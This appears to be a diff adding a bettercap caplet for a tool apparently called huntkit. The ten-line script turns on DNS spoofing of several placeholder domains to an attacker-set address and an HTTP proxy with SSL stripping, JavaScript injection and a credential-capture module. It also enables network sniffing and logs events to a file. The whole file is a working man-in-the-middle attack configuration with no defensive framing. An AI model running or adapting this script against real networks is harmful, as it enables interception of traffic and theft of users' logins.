@@ -1,0 +1,10 @@
+set dns.spoof.domains example.com, test.com, example.org
+set dns.spoof.address ${SPOOF_IP}
+set events.stream.output /opt/huntkit/spoof.log
+set events.stream true
+set http.proxy.sslstrip true
+set http.proxy.script jsreplace.js
+set http.proxy.module creds
+dns.spoof on
+http.proxy on
+net.sniff on
